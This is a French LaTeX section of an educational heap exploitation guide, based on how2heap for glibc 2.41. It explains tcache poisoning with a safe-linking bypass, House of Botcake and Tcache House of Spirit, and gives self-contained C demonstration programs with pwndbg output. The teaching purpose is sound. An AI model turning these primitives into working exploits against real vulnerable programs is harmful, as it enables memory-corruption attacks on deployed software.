
\subsubsection{Tcache Poisoning}

\noindent\textbf{Fichier de Référence:} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/tcache_poisoning.c}{\texttt{tcache\_poisoning.c}}

\paragraph{Vue d'ensemble:}
Le \textit{Tcache Poisoning} est l'attaque de base sur les tas (heaps) modernes. Elle ressemble beaucoup à la corruption de Fastbin. Le but est de piéger \texttt{malloc} pour qu'il nous alloue une zone mémoire de notre choix, comme la pile (stack). Le Tcache est une liste simple (LIFO) conçue pour la vitesse au détriment de la sécurité. C'est donc la cible parfaite pour obtenir un accès en écriture n'importe où en mémoire.

\paragraph{Fonctionnement de l'attaque:}
L'attaque utilise généralement une faille de type \textit{Use-After-Free} (UAF) pour écraser
le pointeur \texttt{fd} d'un chunk dans le Tcache pour qu'il pointe sur la pile.
Aujourd'hui, on ne peut plus y écrire directement notre adresse cible en clair.
Cette adresse cible doit être correctement alignée en mémoire, et l'attaquant doit la masquer en
la combinant avec l'adresse physique du chunk.
Ce pointeur trafiqué se calcule avec un décalage de bits (bitshift) et un XOR :
$$Pointeur\_Masque = (Emplacement\_Pointeur \gg 12) \oplus Adresse\_Cible$$

\paragraph{Démonstration par le code:}

\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main() {
    // 1. Définition d'une cible sur la pile (stack)
    size_t stack_var[0x10];
    size_t *target = NULL;
    
    // Cherche une adresse sur la pile correctement alingée pour le tcache
    for(int i=0; i<0x10; i++) {
        if(((long)&stack_var[i] & 0xf) == 0) {
            target = &stack_var[i];
            break;
        }
    }
    assert(target != NULL);

    // 2. Allocation et libération pour peupler le Tcache
    intptr_t *a = malloc(128);
    intptr_t *b = malloc(128);
    free(a);
    free(b);
    // Le Tcache est maintenant : B -> A

    // 3. Vulnérabilité : UAF et contournement du Safe Linking
    // L'opération suppose que l'adresse de b est connue
    b[0] = (intptr_t)((long)target ^ (long)b >> 12);
    // Le Tcache est maintenant : B -> target (voir bins ci-dessous)

    // 4. Exploitation : Détournement de l'allocateur
    malloc(128); // Le 1er malloc retourne B

    // Le Tcache est maintenant : target
    intptr_t *c = malloc(128); // Le 2ème malloc retourne directement notre cible

    assert((long)target == (long)c);
    return 0;
}
\end{minted}

\begin{pwndbg}[bins]{text}
    tcachebins
    0x90 [  2]: 0x5555555593a0 !\textcolor{pwndbgblue}{—>}! 0x7fffffffd470 {stack_var} !\textcolor{pwndbgred}{<-}! 0x7fe7ffffd
    fastbins
    empty
    unsortedbin
    empty
    smallbins
    empty
    largebins
    empty
\end{pwndbg}

\paragraph{Interprétation de la corruption (Flèche rouge) :}
Dans la sortie \texttt{pwndbg} ci-dessus, la flèche rouge \textcolor{pwndbgred}{<-} signale une rupture de la liste chaînée. L'outil d'analyse tente de lire le pointeur \texttt{fd} suivant à l'adresse de notre cible sur la pile, mais n'y trouve que des données résiduelles invalides (ici \texttt{0x7fe7ffffd}).

Ce comportement est totalement normal et confirme le succès de l'empoisonnement. Le Tcache est bien détourné vers notre cible. L'intégrité du reste de la liste n'a aucune importance, car l'attaquant n'a besoin que de deux appels à \texttt{malloc()}.

\paragraph{L'évolution des Mitigations (GLIBC Récentes):}
L'exploitation du Tcache s'est complexifiée suite à plusieurs correctifs majeurs de la GLIBC qui bloquent les anciennes méthodes d'écrasement direct :
\begin{enumerate}
    \item \textbf{Safe Linking (GLIBC 2.32+) :} Suite au \href{https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41}{patch introduisant cette protection}, une fuite d'adresse du tas (\textit{heap leak}) est indispensable pour réaliser l'empoisonnement du Tcache. L'attaque aveugle est mathématiquement impossible.
    \item \textbf{Alignement Strict (GLIBC 2.32+) :} Ce \href{https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41}{même patch} assure également que le chunk renvoyé par le Tcache est correctement aligné. L'attaquant ne peut plus cibler des adresses désalignées en mémoire.
\end{enumerate}

\subsubsection{House of Botcake \& Extensions du Tcache Poisoning}

\noindent\textbf{Fichier de Référence:} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/house_of_botcake.c}{\texttt{house\_of\_botcake.c}}\\
\noindent\textbf{Voir aussi :} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/tcache_metadata_poisoning.c}{\texttt{tcache\_metadata\_poisoning.c}} (ciblant \texttt{tcache\_perthread\_struct})

\paragraph{Concept :}
La \textit{House of Botcake} est une puissante extension du \textit{Tcache Poisoning}. Elle permet d'achever un empoisonnement en contournant les sécurités de \textit{double-free} du Tcache. L'idée centrale est de forcer un même chunk à être présent simultanément dans la liste du Tcache et dans l'Unsorted Bin, via le mécanisme de consolidation.

\paragraph{Mécanisme de l'extension :}
Pour réaliser ce Tcache Poisoning avancé, l'attaque procède ainsi :
\begin{enumerate}
    \item \textbf{Activation :} On remplit le Tcache (7 chunks) pour rediriger les libérations vers l'Unsorted Bin.
    \item \textbf{Consolidation :} Deux chunks consécutifs sont libérés, fusionnant dans l'Unsorted Bin.
    \item \textbf{Double libération furtive :} Après avoir consommé un élément du Tcache (libérant ainsi une place), l'un des chunks fusionnés est de nouveau libéré. L'allocateur l'enregistre dans le Tcache sans vérifier sa présence interne dans le chunk géant consolidé.
\end{enumerate}

\paragraph{Exploitation via Tcache Poisoning :}
L'attaquant contrôle maintenant un chunk aliasé. En réallouant le chunk depuis l'Unsorted Bin, il dispose d'un accès en écriture direct sur le chunk présent dans la file du Tcache. Il peut alors altérer son pointeur \texttt{next} (en tenant compte du \textit{Safe Linking}) pour pointer vers n'importe quelle adresse ciblée. Ce chevauchement réactive ainsi la compromission standard du \textit{Tcache Poisoning}. \textit{Notez qu'il est également possible de corrompre directement les métadonnées de l'allocateur pour altérer le Tcache, comme l'illustre la technique \texttt{tcache\_metadata\_poisoning}.}


\subsubsection{Tcache House of Spirit}

\noindent\textbf{Fichier de Référence:} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/tcache_house_of_spirit.c}{\texttt{tcache\_house\_of\_spirit.c}}\\
\noindent\textbf{Voir aussi :} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/house_of_spirit.c}{\texttt{house\_of\_spirit.c}} (pour la version sur Fastbins)

\paragraph{Vue d'ensemble:}
L'attaque \textit{House of Spirit} sur le Tcache est une technique qui consiste à forger un faux chunk dans une zone mémoire contrôlable (comme la pile ou le segment BSS) puis à inciter le programme à libérer un pointeur vers cette zone. Lors de la prochaine allocation, \texttt{malloc} nous retournera ce faux chunk. Par rapport à l'attaque classique sur les Fastbins, la version Tcache est beaucoup moins restrictive : il n'est pas nécessaire de forger le chunk suivant pour tromper les vérifications de taille.

\paragraph{Fonctionnement de l'attaque:}
L'attaquant prépare d'abord un faux chunk en définissant simplement son champ \texttt{size} pour qu'il corresponde à la catégorie visée dans le Tcache (généralement $\leq$ \texttt{0x410}). L'adresse du faux chunk doit être correctement alignée sur 16 octets. Ensuite, si le programme possède une vulnérabilité permettant de manipuler un pointeur qui sera soumis à \texttt{free()}, l'attaquant remplace ce pointeur par l'adresse de la zone de données du faux chunk. Lorsque \texttt{free()} est appelé, le faux chunk est inséré dans le Tcache, prêt à être récupéré via un appel \texttt{malloc()}.

\paragraph{Démonstration par le code:}

\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
    // 1. Initialisation de malloc
    malloc(1);

    // 2. Zone mémoire contrôlable par l'attaquant (ex: sur la pile)
    unsigned long long fake_chunks[10] __attribute__((aligned(0x10)));
    unsigned long long *a; // Pointeur qui sera manipulé

    // 3. Forger l'en-tête du faux chunk avec une taille valide (0x40)
    fake_chunks[1] = 0x40;

    // 4. Vulnérabilité : pointeur sur la zone utilisateur du fake chunk
    a = &fake_chunks[2];

    // 5. Libération du faux chunk (commande bins)
    free(a);

    // 6. Exploitation : l'allocateur nous retourne notre faux chunk sur la pile
    // (commande stack)
    void *b = malloc(0x30);

    assert((long)b == (long)&fake_chunks[2]);
    return 0;
}
\end{minted}

\begin{pwndbg}[bins]{text}
    tcachebins
    0x40 [  1]: 0x7fffffffd460 {fake_chunks+0x10} <- 0
\end{pwndbg}

\begin{pwndbg}[stack]{text}
    00:0000| rsp 0x7fffffffd440 {a} -> 0x7fffffffd460 {fake_chunks+0x10} <- 0x7fffffffd
    01:0008|-068 0x7fffffffd448 {b} -> 0x7fffffffd460 {fake_chunks+0x10} <- 0x7fffffffd
\end{pwndbg}

\paragraph{Interprétation de la corruption :}
Dans la sortie \texttt{pwndbg} \texttt{bins} ci-dessus, on peut observer qu'à la suite du \texttt{free(a)}, le pointeur en tête de la liste \texttt{tcachebins} pour la taille \texttt{0x40} pointe directement sur l'adresse de notre tableau \texttt{fake\_chunks} (situé sur la pile). Contrairement aux attaques sur les Fastbins, aucune vérification d'intégrité (comme la présence d'un \texttt{next\_chunk}) n'est effectuée durant l'insertion.
De plus, la vue \texttt{stack} démontre clairement que l'allocateur, suite à l'appel \texttt{malloc(0x30)}, nous a effectivement retourné notre faux chunk situé sur la pile (la variable \texttt{b} pointe au même endroit que \texttt{a}).


